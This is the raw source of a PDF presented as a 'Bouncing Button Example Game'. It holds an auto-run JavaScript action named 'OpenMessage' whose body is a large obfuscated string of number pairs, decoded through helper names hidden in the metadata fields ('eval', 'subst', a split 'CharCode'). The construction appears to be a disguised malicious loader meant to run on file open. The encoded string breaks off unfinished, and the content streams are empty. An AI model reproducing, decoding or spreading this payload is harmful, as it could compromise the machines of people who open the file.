%PDF-1.6
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</CreationDate(D:20060216150351-08'00')/Subject(pli)/Copyright(Copyright © 2006 Windjack Solutions, Inc.)/Author(eval)/Creator(Acrobat PDFMaker 7.0.5 for PowerPoint)/Producer(subst)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(Bouncing Button Example Game)/Keywords (qmCharCodegees)>>
endobj
21 0 obj
<</MarkInfo<</Marked true>>/Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[(OpenMessage)76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 1108/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 539/Filter/FlateDecode/Type/Contents>>stream
endstream
endobj
61 0 obj
<</Subtype/TrueType/FontDescriptor 71 0 R/LastChar 255/Widths[750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 750 278 278 355 556 556 889 667 191 333 333 389 584 278 333 278 278 556 556 556 556 556 556 556 556 556 556 278 278 584 584 584 556 1015 667 667 722 722 667 611 778 722 278 500 667 556 833 722 778 667 778 722 667 611 722 667 944 667 667 611 278 278 278 469 556 333 556 556 500 556 556 278 556 556 222 222 500 222 833 556 556 556 556 333 500 278 556 500 722 500 500 500 334 260 334 584 350 556 350 222 556 333 1000 556 556 333 1000 667 333 1000 350 611 350 350 222 222 333 333 350 556 1000 333 1000 500 333 944 350 500 667 278 333 556 556 556 556 260 556 333 737 370 556 584 333 737 552 400 549 333 333 333 576 537 278 333 333 365 556 834 834 834 611 667 667 667 667 667 667 1000 722 667 667 667 667 278 278 278 278 722 722 778 778 778 778 778 584 778 722 722 722 722 667 667 611 556 556 556 556 556 556 889 500 556 556 556 556 278 278 278 278 556 556 556 556 556 556 556 549 611 556 556 556 556 500 556 500]/BaseFont/QBFUZS+Arial/FirstChar 0/Encoding/WinAnsiEncoding/Type/Font>>
endobj
76 0 obj
<</S/JavaScript/JS(
asd='12466c-12348c27115c-27018c31470c-31356c27337c-27305c6822c-6724c10262c-10156c14799c-14684c42c61c17801c-17740c1649c-1610c29892c-29855c1155c-1038c12213c-12156c27416c-27368c7900c-7843c5646c-5598c1579c-1542c12818c-12701c31074c-31017c30230c-30182c9246c-9189c11417c-11369c1005c-968c4349c-4232c18963c-18914c5113c-5059c29338c-29237c19897c-19799c13688c-13651c15825c-15708c22451c-22400c1512c-1414c18299c-18201c21264c-21207c28849c-28812c25121c-25004c6885c-6837c19007c-18959c521c-473c24686c-24637c20656c-20619c30413c-30296c25841c-25785c8227c-8129c530c-482c9100c-9052c13873c-13836c2109c-1992c21918c-21868c20305c-20253c7697c-7646c6522c-6470c7080c-7043c16718c-16601c18886c-18784c1401c-1346c21831c-21775c15567c-15510c21298c-21261c10877c-10760c31393c-31342c19108c-19007c12389c-12333c25050c-25002c15730c-15693c16597c-16480c25529c-25474c22615c-22563c2947c-2846c26050c-25993c14644c-14607c23603c-23486c23806c-23709c7829c-7730c7189c-7141c24336c-24282c24944c-24907c21062c-20945c1803c-1751c14205c-14155c16726c-16675c9501c-9449c28742c-28705c23806c-23689c1577c-1476c14971c-14921c25208c-25111c31423c-31326c5896c-5859c21864c-21747c9644c-9545c12647c-12596c16330c-16228c30048c-29951c5040c-5003c32061c-31944c13988c-13887c30569c-30516c22019c-21918c16935c-16879c23962c-23925c12022c-11905c15897c-15795c15111c-15009c27866c-27764c23086c-22984c14805c-14768c20153c-20036c19506c-19409c16609c-16511c9716c-9614c11590c-11488c1468c-1431c5801c-5684c2740c-2688c3045c-2994c28787c-28735c3306c-3205c1811c-1774c2026c-1909c528c-476c19470c-19420c22689c-22637c16859c-16809c16862c-16825c27729c-27612c24278c-24179c30850c-30799c25642c-25593c13640c-13541c23144c-23107c24962c-24845c1020c-971c14399c-14298c7417c-7320c28886c-28785c4828c-4791c30237c-30120c16382c-16330c32349c-32299c14189c-14137c26098c-26047c11283c-11246c23672c-23555c7257c-7158c22038c-21940c2075c-2023c3387c-3337c25344c-25307c3887c-3770c13429c-13330c1230c-1128c23357c-23260c3461c-3408c18089c-18052c15577c-15460c6548c-6495c17725c-17675c13771c-13723c32190c-32090c31366c-31329c12273c-12156c32511c-32461c7744c-7644c26672c-26573c7271c-7169c3974c-3937c6858c-6741c12866c-12811c20356c-20305c6550c-6501c27056c-27002c21813c-21776c17833c-17716c26086c-26037c29070c-29017c7214c-7157c28162c-28105c32458c-32421c7916c-7799c7407c-7358c21245c-21196c9147c-9098c6122c-6071c24706c-24669c2594c-2477c21700c-21651c31254c-31205c20320c-20271c10829c-10780c6146c-6109c27044c-26927c23102c-23053c6000c-5951c2131c-2082c25132c-25083c21286c-21249c14120c-14003c31990c-31941c1495c-1446c1820c-1771c5883c-5834c3909c-3872c23633c-23516c31732c-31683c5354c-5305c20046c-19997c14304c-14249c859c-822c27862c-27745c22221c-22171c8266c-8169c16450c-16401c6726c-6677c22403c-22366c16514c-16397c17335c-17283c11446c-11395c23127c-23075c13013c-12959c22275c-22238c4631c-4514c15415c-15363c20735c-20685c18646c-18594c25562c-25512c13210c-13173c7275c-7158c7025c-6976c12543c-12491c16785c-16736c8845c-8790c26442c-26405c28710c-28593c7836c-7786c25517c-25420c1407c-1358c3241c-3192c15179c-15142c10281c-10164c6461c-6411c12758c-12659c26562c-26512c22912c-22812c19484c-19447c16308c-16191c14784c-14732c12178c-12128c27755c-27703c5254c-5204c25191c-25154c25388c-25271c17900c-17849c15965c-15910c21482c-21432c3889c-3792c8870c-8833c2035c-1918c19179c-19129c15895c-15794c22594c-22543c3308c-3260c99c-62c24394c-24277c7376c-7327c15950c-15896c25269c-25219c16798c-16696c19191c-19154c7791c-7674c27079c-26980c25653c-25554c20550c-20500c20984c-20887c23923c-23886c15392c-15275c12650c-12598c6050c-5951c27570c-27522c7748c-7649c19320c-19283c28120c-28003c8495c-8398c4563c-4466c11428c-11331c29977c-29876c16468c-16431c20298c-20181c7370c-7318c2990c-2940c11551c-11503c5322c-5225c14313c-14276c11650c-11533c29716c-29664c29704c-29654c2959c-2907c22328c-22278c13845c-13808c22150c-22033c5478c-5381c8267c-8170c23161c-23112c1386c-1336c4609c-4572c22442c-22325c16778c-16726c17260c-17210c3851c-3800c19707c-19606c366c-329c23171c-23054c15170c-15118c8861c-8811c3092c-3040c1956c-1906c14196c-14159c27575c-27458c30269c-30212c21567c-21517c30566c-30468c9163c-9063c26889c-26852c20237c-20120c28829c-28773c31964c-31910c17285c-17186c31788c-31739c29650c-29613c31130c-31013c29296c-29246c2471c-2374c14756c-14704c27816c-27719c11872c-11835c27380c-27263c17601c-17504c28651c-28551c11983c-11935c21452c-21352c23716c-23679c20365c-20248c19981c-19929c14244c-14189c4584c-4536c31089c-30989c16200c-16163c18781c-18664c26007c-25910c21827c-21730c7691c-7642c23916c-23866c30990c-30953c9938c-9821c19512c-19460c2520c-2470c17260c-17210c4140c-4039c9666c-9629c14254c-14137c2613c-2561c14321c-14271c24740c-24688c17369c-17319c9480c-9443c3956c-3839c20108c-20051c2439c-2389c7965c-7867c32091c-31991c23892c-23855c31681c-31564c27814c-27758c19231c-19181c13268c-13169c32399c-32344c17663c-17626c4826c-4709c18523c-18470c11014c-10961c26653c-26602c1572c-1517c10288c-10251c344c-227c19525c-19476c29800c-29746c2865c-2815c4129c-4073c9298c-9261c20546c-20429c18383c-18285c11912c-11863c10225c-10176c18481c-18383c4639c-4602c19705c-19588c22437c-22387c24747c-24650c30160c-30059c30402c-30346c32197c-32160c21395c-21278c4784c-4686c27354c-27255c15984c-15933c18052c-18004c2454c-2417c991c-874c22878c-22825c20977c-20925c20020c-19918c24889c-24840c30564c-30527c5666c-5549c25234c-25181c17433c-17331c10825c-10728c3457c-3360c29577c-29540c20123c-20006c24003c-23951c23318c-23268c32035c-31983c1572c-1522c9142c-9105c12033c-11916c29292c-29243c6938c-6888c4123c-4071c26795c-26745c12698c-12661c3663c-3546c23548c-23499c17483c-17432c6376c-6279c6876c-6779c10893c-10856c8830c-8713c15882c-15830c9130c-9080c5166c-5114c3245c-3195c1362c-1325c11088c-10971c16926c-16828c26596c-26496c3879c-3827c27751c-27701c5411c-5374c799c-682c15218c-15169c29415c-29366c32132c-32075c22611c-22561c6345c-6308c16633c-16516c1987c-1889c10995c-10896c23571c-23521c6111c-6055c13149c-13112c3612c-3495c17789c-17690c4040c-3942c29110c-29060c32180c-32083c18931c-18894c7347c-7230c16369c-16317c10171c-10120c24492c-24442c29550c-29450c21431c-21394c25854c-25737c7981c-7884c5701c-5604c27809c-27707c19876c-19774c795c-758c563c-446c28690c-28638c24028c-23978c5336c-5284c28166c-28069c13983c-13946c19696c-19579c12142c-12090c15970c-15920c6050c-5998c11071c-11021c30096c-30059c19199c-19082c22698c-22601c23244c-23147c31254c-31205c19152c-19102c30782c-30745c25544c-25427c1857c-1805c14494c-14444c3058c-3003c26349c-26248c19402c-19365c32505c-32388c27561c-27509c2742c-2692c5549c-5497c30728c-30678c22618c-22581c14359c-14242c6650c-6593c26666c-26616c5731c-5633c20001c-19901c22175c-22138c27729c-27612c15056c-15001c9675c-9624c19057c-19007c21106c-21056c20746c-20709c24512c-24395c15663c-15613c18803c-18749c23114c-23058c14260c-14210c5298c-5261c21239c-21122c15162c-15113c15170c-15120c11092c-10993c26236c-26179c16877c-16840c30494c-30377c26084c-25985c19796c-19739c8594c-8539c31633c-31583c17868c-17831c31212c-31095c21350c-21298c32533c-32432c25222c-25173c2439c-2391c19877c-19840c22755c-22638c30168c-30119c10291c-10243c7789c-7690c24584c-24527c6755c-6718c3893c-3776c16439c-16340c22418c-22361c22696c-22643c14911c-14857c12037c-12000c3352c-3235c3493c-3439c27199c-27102c18522c-18471c22600c-22552c20778c-20741c2742c-2625c28453c-28400c22220c-22123c30554c-30452c4390c-4292c21196c-21159c15765c-15648c10961c-10909c17905c-17855c23656c-23604c11541c-11491c20344c-20307c18891c-18774c1639c-1584c25871c-25820c29183c-29131c17443c-17393c17798c-17761c3281c-3164c21337c-21282c9595c-9544c1058c-960c19391c-19291c24506c-24469c13095c-12978c22744c-22643c3357c-3256c15652c-15596c8609c-8559c25958c-25921c11789c-11672c19367c-19317c21754c-21703c1352c-1297c25279c-25178c1502c-1465c30564c-30447c8387c-8335c12463c-12415c15812c-15761c7401c-7300c24004c-23967c3499c-3382c26292c-26238c1002c-952c29370c-29316c22818c-22717c18445c-18408c22526c-22409c1458c-1402c15140c-15040c7479c-7423c2516c-2465c1875c-1838c31985c-31868c23626c-23574c24619c-24568c10701c-10649c14636c-14534c8586c-8549c4002c-3885c26425c-26328c3311c-3263c1114c-1058c27778c-27725c28590c-28553c2616c-2499c1043c-944c12335c-12284c15080c-14982c16855c-16805c19736c-19699c6427c-6310c28369c-28320c21387c-21330c15444c-15346c441c-341c11548c-11511c1233c-1116c22967c-22919c21021c-20965c24388c-24286c30447c-30346c31552c-31515c26263c-26146c5133c-5034c30536c-30479c26240c-26190c15834c-15778c12516c-12479c10185c-10068c27851c-27798c6284c-6234c21511c-21463c28965c-28917c9420c-9383c25460c-25343c6940c-6887c10463c-10415c5138c-5039c22020c-21963c27318c-27281c233c-116c3805c-3748c23031c-22933c21620c-21569c19250c-19195c23472c-23435c8526c-8409c28498c-28450c21797c-21743c29548c-29449c20229c-20131c27602c-27565c3801c-3684c21851c-21798c79c22c1681c-1627c23449c-23395c23928c-23891c14197c-14080c977c-921c19123c-19074c20481c-20431c22489c-22438c23446c-23409c5260c-5143c15292c-15193c30386c-30329c15723c-15673c28445c-28395c27764c-27727c18400c-18283c4036c-3982c31570c-31516c16789c-16739c25656c-25555c26178c-26141c7604c-7487c9541c-9442c30034c-29977c4759c-4705c6432c-6378c25621c-25584c32362c-32245c18248c-18193c22830c-22729c7799c-7751c19929c-19874c13623c-13586c7085c-6968c1469c-1420c14600c-14546c1566c-1467c29966c-29909c12447c-12410c25013c-24896c2569c-2518c3097c-3000c30757c-30705c26307c-26252c6901c-6864c25865c-25748c12050c-11953c10937c-10881c136c-84c4197c-4146c11952c-11915c1672c-1555c19816c-19768c21493c-21437c31706c-31607c24576c-24519c3283c-3246c28c89c32296c-32197c21531c-21474c22859c-22806c7438c-7341c8804c-8767c3825c-3708c22538c-22484c18288c-18238c26440c-26391c24105c-24049c23612c-23575c14246c-14129c24476c-24379c1539c-1482c25358c-25306c22576c-22525c27847c-27810c32259c-32142c23799c-23744c15255c-15201c18555c-18458c23935c-23886c19453c-19416c5865c-5748c25607c-25508c6612c-6555c27358c-27310c14c84c6546c-6509c30641c-30524c43c56c6185c-6128c27530c-27475c30917c-30863c21638c-21601c3677c-3560c10100c-10003c11520c-11421c29981c-29929c3883c-3832c10983c-10946c20936c-20819c26144c-26046c2802c-2702c22476c-22421c18846c-18795c25378c-25341c25681c-25564c26463c-26407c16521c-16471c8279c-8224c20376c-20325c15814c-15777c3090c-2973c26241c-26140c16780c-16679c17718c-17620c20942c-20841c16794c-16757c24264c-24147c26941c-26885c24852c-24802c5808c-5709c21815c-21761c23112c-23075c27446c-27329c850c-798c555c-502c14324c-14273c30831c-30777c12454c-12417c25307c-25190c27126c-27070c5941c-5841c3467c-3411c16945c-16894c145c-108c28846c-28729c9969c-9917c1967c-1916c20725c-20673c26263c-26161c22343c-22306c3882c-3765c29354c-29257c23943c-23886c20662c-20606c14415c-14362c20243c-20206c12815c-12698c14037c-13982c14528c-14471c13025c-12927c19845c-19791c11701c-11664c11496c-11379c14635c-14581c12551c-12497c12051c-12000c4317c-4216c18741c-18704c32520c-32403c4983c-4932c13210c-13155c13820c-13766c8450c-8353c5513c-5476c21980c-21863c12654c-12555c15482c-15425c23947c-23850c722c-671c17103c-17066c21649c-21532c12620c-12566c21815c-21761c12935c-12886c8640c-8584c3573c-3536c521c-404c29470c-29373c17611c-17554c23064c-23012c9839c-9788c12814c-12777c2108c-1991c21335c-21236c27449c-27392c22675c-22625c8744c-8692c7125c-7088c8759c-8642c16623c-16575c12108c-12051c29984c-29932c30443c-30342c20558c-20521c2840c-2723c27781c-27732c8571c-8515c26337c-26238c19072c-19015c9293c-9256c10783c-10666c16079c-16027c29928c-29877c32599c-32546c4372c-4271c13927c-13890c11530c-11413c4893c-4794c10740c-10683c4499c-4402c3316c-3259c28594c-28557c17314c-17197c5424c-5325c25287c-25230c20121c-20069c28099c-28045c9390c-9353c27246c-27129c12216c-12119c26013c-25916c14712c-14660c9543c-9492c31814c-31777c10629c-10512c12383c-12335c26938c-26884c19200c-19101c14078c-13980c21368c-21331c3851c-3734c24862c-24809c4790c-4689c9138c-9084c162c-108c9162c-9125c23065c-22948c19707c-19651c22071c-22023c9163c-9113c24207c-24156c25387c-25350c13116c-12999c16879c-16827c6169c-6119c5746c-5694c12358c-12261c9627c-9590c15136c-15019c14963c-14866c21843c-21743c16507c-16410c29675c-29578c6745c-6708c15664c-15547c7647c-7549c19128c-19028c9946c-9848c2205c-2106c550c-513c31314c-31197c6057c-6007c770c-673c11463c-11365c15195c-15095c8947c-8910c20625c-20508c13618c-13567c28654c-28600c10039c-9988c30796c-30742c28219c-28182c10784c-10667c11255c-11200c12441c-12385c16954c-16903c25017c-24967c158c-121c26581c-26464c15511c-15457c15121c-15021c15767c-15713c32019c-31919c12139c-12102c30527c-30410c15026c-14976c27802c-27747c16999c-16949c330c-231c5365c-5328c25564c-25447c7003c-6953c11422c-11371c1692c-1642c18466c-18365c1975c-1938c10639c-10522c6434c-6384c23608c-23509c14651c-14601c24489c-24391c21748c-21711c10214c-10097c2616c-2566c8361c-8262c30670c-30620c19570c-19471c721c-684c30828c-30711c13494c-13440c16233c-16134c13292c-13237c4620c-4572c23610c-23573c790c-673c2490c-2440c5979c-5879c3950c-3900c27504c-27455c14325c-14288c9315c-9198c28426c-28372c21328c-21228c28753c-28703c30118c-30016c7137c-7100c6086c-5969c16115c-16061c21586c-21487c29695c-29645c30767c-30713c13418c-13381c26801c-26684c16339c-16289c16035c-15938c10520c-10469c14352c-14302c2948c-2911c11242c-11125c12524c-12469c24458c-24358c2833c-2782c1174c-1124c4436c-4399c26443c-26326c9979c-9924c6926c-6824c7780c-7730c13929c-13877c9789c-9752c30120c-30003c31260c-31205c5558c-5508c18791c-18736c2714c-2663c11035c-10998c25928c-25811c16815c-16761c2508c-2456c14858c-14803c21868c-21770c8633c-8596c3634c-3517c16012c-15957c24972c-24870c19669c-19619c26533c-26478c6668c-6631c30633c-30516c13133c-13081c27207c-27157c22434c-22379c23981c-23926c3739c-3700c26870c-26811c25782c-25680c13719c-13602c9154c-9044c8920c-8821c3006c-2890c18943c-18838c6384c-6273c9624c-9514c32517c-32485c533c-432c12338c-12216c10895c-10777c1820c-1706c4512c-4472c13403c-13289c24693c-24596c26380c-26336c22037c-21924c28327c-28206c17751c-17710c22367c-22244c15340c-15221c19642c-19538c29035c-28930c13316c-13208c8133c-8032c31600c-31560c11108c-10994c32114c-32017c2683c-2637c13336c-13228c597c-496c24417c-24307c22490c-22387c9517c-9401c2781c-2677c16792c-16750c23916c-23866c12406c-12346c16652c-16539c24450c-24329c102c-61c27547c-27424c26270c-26156c4614c-4517c16308c-16265c18306c-18245c30995c-30881c13703c-13606c13976c-13917c24104c-23979c3414c-3401c4674c-4664c11089c-10975c7807c-7710c26005c-25944c19222c-19108c6751c-6654c4456c-4410c26694c-26579c17449c-17332c17792c-17694c27291c-27176c9209c-9093c15641c-15527c12166c-12061c20005c-19895c32433c-32330c3426c-3386c32411c-32363c16428c-16384c3234c-3121c32514c-32393c19333c-19286c29504c-29454c12486c-12445c10999c-10940c15153c-15039c18839c-18738c24703c-24587c4487c-4370c10286c-10172c28117c-28007c9162c-9130c29390c-29276c3267c-3170c2510c-2451c23970c-23845c10018c-9986c14982c-14969c18007c-17997c2825c-2723c8132c-8015c20656c-20546c20049c-19950c23773c-23657c166c-61c7398c-7287c31564c-31454c11607c-11575c7152c-7054c23350c-23230c14841c-14801c15024c-14983c18041c-17918c11688c-11570c27511c-27414c29041c-28927c2199c-2167c21708c-21608c21087c-20980c14701c-14598c31995c-31934c16547c-16437c23863c-23762c4086c-3967c19814c-19782c1732c-1667c28057c-27943c5191c-5077c16714c-16617c21422c-21301c16031c-15991c204c-163c9422c-9363c3424c-3306c31993c-31896c17603c-17489c10822c-10790c30900c-30782c29210c-29091c25989c-25928c29609c-29561c19409c-19289c16372c-16324c14993c-14894c6455c-6407c19241c-19142c11377c-11329c8654c-8555c8292c-8244c32464c-32365c31370c-31311c15645c-15527c24369c-24272c30592c-30478c19732c-19700c11527c-11430c32324c-32224c15132c-15032c24733c-24619c24396c-24335c3897c-3849c8107c-7987c24600c-24548c21334c-21286c19546c-19498c31951c-31903c6280c-6232c30368c-30320c30195c-30136c2833c-2715c31716c-31619c2505c-2391c30257c-30225c15431c-15319c17498c-17401c4055c-3934c2015c-1907c28876c-28765c20724c-20627c10307c-10207c4041c-3980c19438c-19321c1311c-1201c28411c-28310c17373c-17258c21043c-20944c15296c-15199c17040c-16928c11533c-11432c15387c-15347c16794c-16696c15430c-15324c31509c-31394c16752c-16649c4108c-4067c18399c-18340c16047c-15929c18403c-18306c16110c-15996c21600c-21568c29252c-29137c23184c-23085c24105c-24010c26852c-26744c5958c-5857c16961c-16851c30908c-30847c15988c-15876c21195c-21098c18975c-18854c1654c-1546c595c-484c5756c-5659c2965c-2865c29006c-28960c31144c-31036c24008c-23907c19660c-19550c15527c-15424c2884c-2768c10405c-10301c7679c-7637c26329c-26279c9257c-9198c32447c-32329c5795c-5698c27656c-27542c15837c-15805c24199c-24086c19125c-19004c12795c-12734c20794c-20697c9652c-9552c12258c-12158c14989c-14875c23626c-23581c29219c-29179c21255c-21140c14972c-14873c25773c-25678c7574c-7466c16626c-16525c26368c-26258c21345c-21302c27606c-27558c30732c-30612c19833c-19782c18957c-18901c25750c-25709c10718c-10659c29856c-29738c3498c-3401c26413c-26299c31544c-31512c12755c-12634c26203c-26106c12697c-12583c7755c-7640c9383c-9271c4239c-4178c26880c-26763c30193c-30083c391c-290c11890c-11775c9794c-9695c23396c-23299c2859c-2747c14371c-14270c11994c-11954c25847c-25813c15502c-15465c27583c-27466c9816c-9759c9213c-9165c16272c-16215c4766c-4718c15303c-15266c11463c-11346c31738c-31681c8396c-8348c22181c-22124c4296c-4248c11894c-11860c15937c-15896c11198c-11139c24650c-24529c17498c-17401c23895c-23781c7763c-7648c2239c-2127c28135c-28074c10001c-9900c32432c-32310c28526c-28408c21891c-21777c17584c-17544c27280c-27159c109c-12c7314c-7200c6618c-6503c25956c-25844c22816c-22772c1544c-1431c11130c-11009c7388c-7347c25831c-25772c15896c-15778c22691c-22594c4637c-4523c22993c-22961c31088c-30989c2177c-2066c2647c-2530c10325c-10215c26129c-26013c13845c-13795c10333c-10272c10971c-10931c5083c-4965c26111c-25992c21225c-21180c561c-513c3455c-3335c21001c-20949c4446c-4398c25347c-25299c5928c-5880c31726c-31678c814c-766c21257c-21216c13702c-13655c2128c-2031c11417c-11317c23262c-23162c13258c-13144c18805c-18746c16436c-16334c4513c-4402c8839c-8725c29089c-29049c27506c-27388c15285c-15188c6624c-6510c30153c-30121c969c-870c8111c-8000c11341c-11224c11302c-11192c27097c-26981c16424c-16363c12772c-12724c15666c-15607c25001c-24902c16227c-16116c4010c-3893c4805c-4695c16932c-16816c17953c-17893c11889c-11790c17746c-17635c6554c-6437c25592c-25482c19874c-19758c25986c-25936c16197c-16138c8491c-8392c20149c-20038c7991c-7874c13004c-12894c28988c-28872c4423c-4380c7853c-7810c19632c-19591c19062c-18939c13364c-13264c20601c-20494c27174c-27071c24705c-24614c7261c-7162c21614c-21503c16487c-16370c20033c-19923c4623c-4507c16846c-16753c3604c-3543c16648c-16527c29666c-29569c20536c-20422c9960c-9845c8899c-8787c13641c-13598c16514c-16402c9849c-9752c8873c-8752c17858c-17750c1404c-1293c17364c-17267c5350c-5250c9395c-9336c30368c-30243c9696c-9664c21834c-21821c13579c-13569c29328c-29210c16254c-16157c26943c-26829c17272c-17240c10771c-10660c27006c-26888c32549c-32448c32386c-32272c18852c-18750c19925c-19817c12367c-12256c3041c-2922c23529c-23468c29016c-28899c8066c-7956c19424c-19323c6319c-6204c24980c-24881c8423c-8326c30848c-30736c2172c-2071c17296c-17256c24064c-24030c11591c-11554c10019c-9902c29414c-29366c29001c-28902c15745c-15697c14468c-14369c26193c-26156c29325c-29208c11140c-11092c9791c-9692c23611c-23563c3770c-3671c20562c-20528c25976c-25935c3662c-3603c28306c-28187c12171c-12067c23588c-23483c8017c-7909c23227c-23126c22475c-22435c12391c-12280c31293c-31175c17257c-17156c26725c-26611c31631c-31529c25680c-25572c274c-163c9161c-9042c18335c-18289c24338c-24230c20752c-20651c3712c-3602c29110c-29007c25112c-24996c19457c-19353c10921c-10861c18648c-18596c16125c-16073c30076c-30019c28439c-28386c15095c-15045c1190c-1149c24360c-24237c16429c-16318c4852c-4734c20009c-19908c28600c-28486c3798c-3696c3384c-3276c27185c-27074c26274c-26155c23790c-23747c1180c-1119c10874c-10763c25873c-25755c154c-53c11913c-11799c26147c-26045c9316c-9208c5606c-5495c25843c-25724c5426c-5367c9318c-9193c30311c-30279c30538c-30525c28775c-28765c16591c-16475c16530c-16426c20259c-20154c14010c-13895c20327c-20281c10712c-10613c15200c-15089c12030c-11922c27141c-27033c28068c-27971c7398c-7300c31099c-31016c31866c-31750c18797c-18686c25627c-25513c25483c-25382c17946c-17885c26807c-26740c11716c-11605c11162c-11054c2320c-2212c31644c-31547c12668c-12570c11636c-11590c12608c-12509c13869c-13758c17062c-16954c21926c-21818c19539c-19438c14944c-14845c26059c-25943c3473c-3404c6832c-6723c21676c-21579c17483c-17378c27159c-27051c32388c-32315c27c83c14548c-14446c26872c-26761c3453c-3413c21946c-21823c25314c-25199c2662c-2545c16101c-16003c26300c-26194c3504c-3446c1390c-1356c20450c-20416c23235c-23191c20568c-20459c30785c-30670c22222c-22119c8594c-8536c9764c-9653c10188c-10070c22463c-22362c2185c-2071c32114c-32012c9345c-9237c25144c-25033c874c-755c12818c-12693c31976c-31935c22551c-22492c5660c-5535c1836c-1804c30297c-30284c13702c-13692c16384c-16282c32528c-32411c17155c-17045c13688c-13589c25185c-25069c19817c-19712c29790c-29679c18828c-18718c23321c-23289c6538c-6426c14637c-14523c21914c-21809c27106c-26996c20780c-20664c11479c-11377c11058c-11018c5903c-5862c29682c-29559c865c-755c8088c-7977c29139c-29027c18225c-18164c8590c-8473c5372c-5262c6402c-6301c15924c-15809c3281c-3182c20077c-19980c17760c-17648c921c-820c1122c-1082c1488c-1454c792c-755c18277c-18160c23191c-23143c1336c-1271c13452c-13404c20324c-20259c28179c-28142c12132c-12015c2221c-2173c18174c-18109c1389c-1341c4685c-4620c6298c-6261c20884c-20767c15744c-15696c12201c-12136c17909c-17861c24624c-24559c28304c-28267c22407c-22290c10192c-10144c4237c-4172c27779c-27731c24609c-24544c20161c-20127c6418c-6377c12029c-11970c13279c-13161c7339c-7242c21166c-21052c22782c-22750c16147c-16035c6786c-6689c13317c-13196c17483c-17375c28254c-28143c984c-887c21020c-20920c7729c-7668c11220c-11103c6538c-6428c17133c-17032c15906c-15791c12836c-12737c5360c-5263c31650c-31538c395c-294c31285c-31245c23617c-23519c28699c-28593c21035c-20920c9167c-9064c279c-238c24172c-24113c9135c-9031c28455c-28354c5948c-5851c29179c-29067c9077c-8979c13287c-13179c17689c-17578c31860c-31761c4792c-4685c32490c-32429c12520c-12410c30290c-30179c28087c-27975c21519c-21476c18654c-18542c11174c-11077c83c38c25192c-25084c3666c-3555c24004c-23907c13386c-13286c9026c-8967c22997c-22899c13781c-13676c15669c-15566c21972c-21874c9823c-9715c12062c-11951c31139c-31040c18117c-18010c11592c-11531c15632c-15515c21930c-21820c17540c-17439c12155c-12040c6365c-6266c6186c-6089c5202c-5090c13583c-13482c10978c-10938c5035c-5001c1461c-1424c8612c-8495c8481c-8433c30996c-30931c2624c-2576c19655c-19590c6437c-6400c27816c-27699c23321c-23273c30441c-30376c16560c-16512c7706c-7641c20781c-20747c30341c-30300c31390c-31331c18111c-18007c15522c-15421c10796c-10699c24608c-24508c8997c-8896c22388c-22274c7584c-7469c6285c-6180c15287c-15165c27754c-27653c12650c-12589c21473c-21423c299c-251c26234c-26175c32451c-32336c5334c-5222c3053c-2939c16421c-16324c13815c-13694c1392c-1331c19045c-18941c8829c-8728c7829c-7732c22219c-22119c7508c-7407c5613c-5499c6122c-6007c23229c-23124c1752c-1630c11821c-11720c21963c-21920c19863c-19759c2701c-2600c8117c-8020c19830c-19718c11698c-11600c5863c-5755c27414c-27303c17983c-17884c21150c-21043c22511c-22465c5992c-5884c9966c-9865c22810c-22700c32226c-32123c17776c-17660c3502c-3398c10637c-10578c1540c-1421c17318c-17214c12030c-11925c28601c-28493c1505c-1404c27874c-27834c18163c-18065c17028c-16923c831c-728c32301c-32203c7601c-7493c10598c-10487c11465c-11366c4922c-4815c5820c-5774c14167c-14059c21054c-20953c25650c-25540c1223c-1120c26917c-26801c28422c-28318c19207c-19147c15411c-15296c26291c-26179c25199c-25085c735c-638c16444c-16323c126c-85c18511c-18388c27961c-27863c10763c-10658c28067c-27964c20637c-20539c30808c-30700c24011c-23900c22142c-22043c26026c-25919c17532c-17489c6514c-6453c2215c-2117c17176c-17071c22130c-22027c20828c-20730c4000c-3892c2410c-2299c26648c-26549c18167c-18060c23464c-23405c27656c-27531c27405c-27373c17724c-17711c23421c-23411c13955c-13853c8493c-8388c17055c-16947c14512c-14404c17244c-17146c8857c-8749c22653c-22542c11113c-11014c4162c-4055c8775c-8714c6523c-6425c24799c-24694c6926c-6823c5892c-5794c22300c-22192c8310c-8199c31440c-31341c4172c-4065c10525c-10479c23974c-23859c1660c-1543c31354c-31256c27974c-27859c4070c-3954c703c-589c21499c-21394c27534c-27424c3718c-3615c16248c-16208c20616c-20568c2497c-2453c5561c-5446c4468c-4356c27568c-27454c20074c-19977c21712c-21591c3768c-3727c10070c-10011c8183c-8085c15945c-15837c26860c-26749c14707c-14608c16103c-15996c1130c-1069c28614c-28516c13761c-13656c17455c-17352c27397c-27299c17933c-17825c27981c-27870c26730c-26631c19593c-19486c2036c-1990c22047c-21932c31678c-31561c10754c-10656c10890c-10775c1913c-1797c14472c-14358c2496c-2391c30544c-30434c16970c-16867c8057c-8017c2355c-2307c11881c-11837c28131c-28033c32082c-31977c23664c-23561c13560c-13462c7609c-7501c14968c-14857c7763c-7664c30331c-30224c31071c-31025c16908c-16800c1646c-1545c12175c-12065c1707c-1604c4402c-4286c5466c-5362c5046c-5001c31132c-31017c25059c-24947c15097c-14983c20522c-20425c32095c-31974c1209c-1168c6770c-6711c1351c-1232c15682c-15578c9266c-9161c7253c-7145c32652c-32551c17324c-17284c9609c-9511c19891c-19783c20813c-20702c17049c-16950c10898c-10791c1716c-1670c16c92c25866c-25765c17495c